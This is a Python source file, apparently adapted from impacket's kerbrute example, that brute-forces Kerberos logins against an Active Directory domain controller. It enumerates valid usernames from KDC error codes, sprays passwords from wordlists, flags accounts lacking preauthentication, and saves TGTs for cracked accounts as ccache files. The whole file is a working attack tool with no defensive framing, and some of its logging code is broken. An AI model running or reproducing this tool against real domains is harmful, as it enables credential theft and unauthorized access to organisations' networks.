import argparse
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from impacket import version
from impacket.examples import logger
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, SessionKeyDecryptionError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache



def get_file_lines(filepath):
    with open(filepath) as fi:
        return [line.strip('\r\n') for line in fi]


def define_args(domain,target_dc):
    parser = argparse.ArgumentParser()
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument('-user', help='User to perform bruteforcing')
    user_group.add_argument('-users', help='File with user per line',default='./tools/names.txt')
    password_group = parser.add_mutually_exclusive_group()
    password_group.add_argument('-password', help='Password to perform bruteforcing')
    password_group.add_argument('-passwords', help='File with password per line',default='./tools/pass.txt')
    parser.add_argument('-domain', help='Domain to perform bruteforcing',default=domain)
    parser.add_argument('-dc-ip', action='store', metavar='<ip_address>',
                          help='IP Address of the domain controller',default=target_dc)
    parser.add_argument('-threads', type=int, default=1,
                          help='Number of threads to perform bruteforcing. Default = 1')
    parser.add_argument('-outputfile', help='File to save discovered user:password')
    parser.add_argument('-outputusers', help='File to save discovered users')
    parser.add_argument('-no-save-ticket', action='store_true',
                          help='Do not save retrieved TGTs with correct credentials',default=True)

    args = parser.parse_args()
    args.users = get_file_lines(args.users) if args.users else [args.user]

    if args.passwords:
        args.passwords = get_file_lines(args.passwords)
    elif args.password:
        args.passwords = [args.password]
    else:
        args.passwords = ['']
    args.save_ticket = not args.no_save_ticket
    return args



def startkerbrute(domain,target_dc):
    log_file = './logs/debug_log.log'
    logger.init()
    args = define_args(domain,target_dc)

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    out_creds_file = open(log_file, "a") #if args.outputfile else None
    out_users_file = open(log_file, "a") #if args.outputusers else None

    kerberos_bruter = KerberosBruter(args.domain, args.dc_ip, args.save_ticket, out_creds_file, out_users_file)
    kerberos_bruter.attack(args.users, args.passwords, args.threads)
    logfile = open('./logs/debug_log.log','a')
    if out_creds_file:
        out_creds_file.close()

    if kerberos_bruter.some_password_was_discovered():
            pass #logfile.write("[*] Saved discovered passwords in %s" % args.outputfile)

    if out_users_file:
        out_users_file.close()
        if kerberos_bruter.some_user_was_discovered():
            pass #logging.info("Saved discovered users in %s" % args.outputusers)

    if not kerberos_bruter.some_user_was_discovered():
        logfile.write("\n[-] No Users Were Discovered")
    if not kerberos_bruter.some_password_was_discovered():
        logfile.write("\n[-] No Passwords Were Discovered")

class KerberosBruter:
    class InvalidUserError(Exception):
        pass

    def __init__(self, domain, kdc_host, save_ticket=True, out_creds_file=None, out_users_file=None):
        self.domain = domain
        self.kdc_host = kdc_host
        self.save_ticket = save_ticket

        self.good_credentials = {}
        self.bad_users = {}
        self.good_users = {}
        self.report_lock = Lock()

        self.out_creds_file = out_creds_file
        self.out_users_file = out_users_file

    def attack(self, users, passwords, threads=1):
        pool = ThreadPoolExecutor(threads)
        threads = []

        for password in passwords:
            for user in users:
                t = pool.submit(self._handle_user_password, user, password)
                threads.append(t)

        for f in as_completed(threads):
            try:
                f.result()
            except Exception as ex:
                pass #logging.debug('Error trying %s:%s %s' % (ex.kerb_user, ex.kerb_password, ex))

    def some_user_was_discovered(self):
        return len(self.good_users) > 0

    def some_password_was_discovered(self):
        return len(self.good_credentials) > 0

    def _handle_user_password(self, user, password):
        try:
            self._check_user_password(user, password)
        except KerberosBruter.InvalidUserError:
            pass
        except Exception as ex:
            ex.kerb_user = user
            ex.kerb_password = password
            raise ex

    def _check_user_password(self, user, password):
        try:
            tgt, user_key = self._try_get_tgt(user, password)
            self._report_good_password(user, password, tgt, user_key)

        except KerberosError as ex:
            if ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                self._report_bad_user(user)

            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                self._report_good_user(user)

            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
                self._report_expired_password(user, password)

            elif ex.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value:
                self._report_blocked_user(user)
            else:
                raise ex

        except SessionKeyDecryptionError as ex:
            self._report_good_user_with_preauth(user, ex.asRep)

    def _try_get_tgt(self, user, password):
        if self._user_credentials_were_discovered(user) or self._is_bad_user(user):
            raise KerberosBruter.InvalidUserError()

        logging.debug('Trying %s:%s' % (user, password))

        username = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, user_key, session_key = getKerberosTGT(username, password, self.domain, lmhash='', nthash='',
                                                            kdcHost=self.kdc_host)
        return tgt, user_key

    def _user_credentials_were_discovered(self, user):
        return user in self.good_credentials

    def _is_bad_user(self, user):
        return user in self.bad_users

    def _report_good_password(self, user, password, tgt, user_key):
        with self.report_lock:
            if user not in self.good_users:
                self.good_users[user] = True

            if user in self.good_credentials:
                return

            self.good_credentials[user] = password

            #logging.info('Stupendous => %s:%s' % (user, password))

            if self.out_creds_file:
                self.out_creds_file.write("\n[+] Valid Password Found: %s:%s" % (user, password))
                self.out_creds_file.flush()
            if self.out_users_file:
                pass #self.out_users_file.write("%s\n" % user)
                #self.out_users_file.flush()

            if self.save_ticket:
                ccache = CCache()
                ccache.fromTGT(tgt, user_key, user_key)

                ccache_file = user + '.ccache'
                ccache.saveFile(ccache_file)
                logging.info('Saved TGT in %s' % ccache_file)

    def _report_expired_password(self, user, password):
        with self.report_lock:
            if user not in self.good_users:
                self.good_users[user] = True

            if user in self.good_credentials:
                return

            self.good_credentials[user] = password

            # logging.info('Stupendous (Expired password) => %s:%s' % (user, password))

            if self.out_creds_file:
                self.out_creds_file.write("%s:%s\n" % (user, password))
                self.out_creds_file.flush()
            if self.out_users_file:
                self.out_users_file.write("%s\n" % user)
                self.out_users_file.flush()

    def _report_bad_user(self, user):
        with self.report_lock:
            if user in self.bad_users:
                #return
                self.bad_users[user] = True
                log_file = './log/debug_log.log'
                log_file.write('[-] Invalid user => %s' % user)

    def _report_good_user(self, user):
        with self.report_lock:
            if user in self.good_users:
                return

            if self.out_users_file:
                self.out_users_file.write("\n[+] Valid User: %s\n" % user)
                self.out_users_file.flush()
                self.good_users[user] = True

    def _report_good_user_with_preauth(self, user, as_rep):
        with self.report_lock:
            if user in self.good_users:
                return

            if self.out_users_file:
                self.out_users_file.write("%s\n" % user)
                self.out_users_file.flush()

            self.good_users[user] = True
            logging.info('Valid user => %s [NOT PREAUTH]' % user)

    def _report_blocked_user(self, user):
        with self.report_lock:
            if user in self.bad_users:
                return

            self.bad_users[user] = True
            logging.info('Blocked/Disabled user => %s' % user)
